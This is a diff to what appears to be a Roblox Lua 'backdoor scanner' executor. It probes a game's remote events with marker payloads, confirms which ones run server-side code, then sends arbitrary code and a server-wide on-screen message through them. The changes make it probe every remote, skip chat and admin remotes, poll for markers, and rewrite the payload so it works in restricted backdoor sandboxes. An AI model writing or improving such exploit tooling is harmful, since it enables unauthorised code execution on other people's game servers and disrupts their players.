@@ -7,7 +7,7 @@ local SoundService = game:GetService("SoundService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerName = LocalPlayer.Name
 
-local VERSION = "5.0"
+local VERSION = "5.1"
 local BOOT_STAMP = os.date("%H:%M:%S")
 
 local ROOT_W = 470
@@ -71,7 +71,9 @@ local State = {
 	modes = { "LUA", "REQUIRE" },
 	sensitivityIndex = 2,
 	sensitivities = { "LOW", "MEDIUM", "HIGH" },
-	sensMinScore = { [1] = 3, [2] = 1, [3] = -999 },
+	-- LOW probes only the strongest name matches; MEDIUM/HIGH probe every
+	-- remote (score only sets the order) — filtering by name misses backdoors
+	sensMinScore = { [1] = 3, [2] = -999, [3] = -999 },
 	settings = {
 		autoHint = true,
 		confirmExec = true,
@@ -783,7 +785,56 @@ local function markerPayload(prefix, guid)
 		'pcall(function() workspace:SetAttribute("' .. prefix .. guid .. '",true) end)',
 		'pcall(function() local s=Instance.new("StringValue") s.Name="' .. prefix .. guid .. '" s.Parent=workspace end)',
 		'pcall(function() local s=Instance.new("StringValue") s.Name="' .. prefix .. guid .. '" s.Parent=game:GetService("Lighting") end)',
+		'pcall(function() local m=Instance.new("Model") m.Name="' .. prefix .. guid .. '" m.Parent=workspace end)',
 	}, " ")
+end
+
+-- events can be missed; poll workspace/lighting for a marker by name
+local function markerExists(prefix, guid)
+	local found = false
+	pcall(function()
+		if workspace:FindFirstChild(prefix .. guid) then
+			found = true
+		end
+	end)
+	if not found then
+		pcall(function()
+			if game:GetService("Lighting"):FindFirstChild(prefix .. guid) then
+				found = true
+			end
+		end)
+	end
+	if not found then
+		pcall(function()
+			if workspace:GetAttribute(prefix .. guid) ~= nil then
+				found = true
+			end
+		end)
+	end
+	return found
+end
+
+-- remotes that are never backdoors (chat / admin frameworks) — probing them
+-- wastes time and spams the server
+local function isKnownJunkRemote(remote)
+	local ok, junk = pcall(function()
+		if remote.Name == "__FUNCTION" or remote:FindFirstChild("__FUNCTION") then
+			return true
+		end
+		local p = remote.Parent
+		if p and p.Name == "DefaultChatSystemChatEvents" then
+			return true
+		end
+		if p and p.Name == "Signals" and p.Parent and p.Parent.Name == "HDAdminClient" then
+			return true
+		end
+		local first = string.split(remote:GetFullName(), ".")[1]
+		if first == "RobloxReplicatedStorage" then
+			return true
+		end
+		return false
+	end)
+	return ok and junk or false
 end
 
 -- different argument shapes real backdoors accept; each carries the same marker code
@@ -847,15 +898,19 @@ local function bestConfirmedRemote()
 end
 
 -- server-side snippet that writes the message on every player's screen
--- (Hint, with Message as fallback) and cleans itself up afterwards
+-- (Hint, with Message as fallback) and cleans itself up afterwards.
+-- Only old globals (spawn/wait via fallbacks) — backdoor sandboxes often
+-- lack the task library, which made the previous payload fail silently.
 local function screenHintPayload(msg)
 	local esc = msg:gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("[\r\n]", " ")
-	return 'task.spawn(function() local done=false pcall(function() local h=Instance.new("Hint") h.Text="'
+	return 'local jzf=function() local done=false local w=(task and task.wait) or wait pcall(function()'
+		.. ' local h=Instance.new("Hint") h.Text="'
 		.. esc
-		.. '" h.Parent=workspace done=true task.wait(10) h:Destroy() end)'
+		.. '" h.Parent=workspace done=true if w then w(10) end h:Destroy() end)'
 		.. ' if not done then pcall(function() local m=Instance.new("Message") m.Text="'
 		.. esc
-		.. '" m.Parent=workspace task.wait(10) m:Destroy() end) end end)'
+		.. '" m.Parent=workspace if w then w(10) end m:Destroy() end) end end'
+		.. ' local jzs=(task and task.spawn) or spawn if jzs then pcall(jzs,jzf) else pcall(jzf) end'
 end
 
 -- score structural signals beyond the name: parent location, sibling names, argument hints
@@ -2442,7 +2497,15 @@ local function watchExecMarker(g)
 			end
 		end)
 	)
-	task.delay(CONFIG.ExecConfirmWindow, function()
+	task.spawn(function()
+		local deadline = os.clock() + CONFIG.ExecConfirmWindow
+		while os.clock() < deadline and not done do
+			if markerExists("JZXE_", g) then
+				finish(true)
+				return
+			end
+			task.wait(0.25)
+		end
 		finish(false)
 	end)
 end
@@ -2501,10 +2564,13 @@ local function executeCurrent()
 			local isFunc = ref:IsA("RemoteFunction")
 			local shapes
 			-- reuse the argument shape that worked during scanning when known,
-			-- rebuilt around the current code so the payload actually arrives
+			-- rebuilt around the current code so the payload actually arrives.
+			-- Detection is async so the recorded shape can be the wrong
+			-- variant — send the plain code as a fallback too.
 			for _, m in ipairs(State.results) do
 				if m.remote == ref and m.workingShape ~= nil then
-					shapes = { applyWorkingShape(m.workingShape, code) }
+					local shaped = applyWorkingShape(m.workingShape, code)
+					shapes = (type(shaped) == "string" and shaped == code) and { code } or { shaped, code }
 					break
 				end
 			end
@@ -2545,7 +2611,13 @@ local function hintBroadcast(message)
 		local ref, shape = bestConfirmedRemote()
 		if ref then
 			local payload = screenHintPayload(message)
-			local shapes = shape and { applyWorkingShape(shape, payload) } or probeVariants(payload)
+			local shapes
+			if shape then
+				local shaped = applyWorkingShape(shape, payload)
+				shapes = (type(shaped) == "string" and shaped == payload) and { payload } or { shaped, payload }
+			else
+				shapes = probeVariants(payload)
+			end
 			for _, s in ipairs(shapes) do
 				local ok = sendPayload(ref, s)
 				if ok then
@@ -2690,7 +2762,9 @@ local function runScanCore()
 		count = count + 1
 		local cn = obj.ClassName
 		if cn == "RemoteEvent" or cn == "RemoteFunction" or cn == "UnreliableRemoteEvent" then
-			table.insert(remotes, obj)
+			if not isKnownJunkRemote(obj) then
+				table.insert(remotes, obj)
+			end
 		elseif cn == "ModuleScript" or cn == "LocalScript" or cn == "Script" then
 			harvestRequireIds(obj, reqFound, reqCounters)
 		end
@@ -2844,7 +2918,13 @@ local function runScanCore()
 	local grace = (State.stats.confirmed > 0) and CONFIG.ExtraWindow or CONFIG.ConfirmWindow
 	local graceEnd = os.clock() + grace
 	while os.clock() < graceEnd do
-		task.wait(0.1)
+		-- events alone miss markers; poll workspace/lighting like the proven scanners do
+		for _, m in ipairs(order) do
+			if m.hits == 0 and markerExists("JZX_", m.guid) then
+				markFound(m)
+			end
+		end
+		task.wait(0.25)
 	end
 	instConn:Disconnect()
 	attrConn:Disconnect()
@@ -2897,7 +2977,12 @@ local function runScanCore()
 		end
 		local vEnd = os.clock() + 4
 		while os.clock() < vEnd and not State.destroyed do
-			task.wait(0.1)
+			for _, m in ipairs(verifyList) do
+				if not m.verified and markerExists("JZV_", m.verifyGuid) then
+					m.verified = true
+				end
+			end
+			task.wait(0.25)
 		end
 		vInst:Disconnect()
 		vAttr:Disconnect()
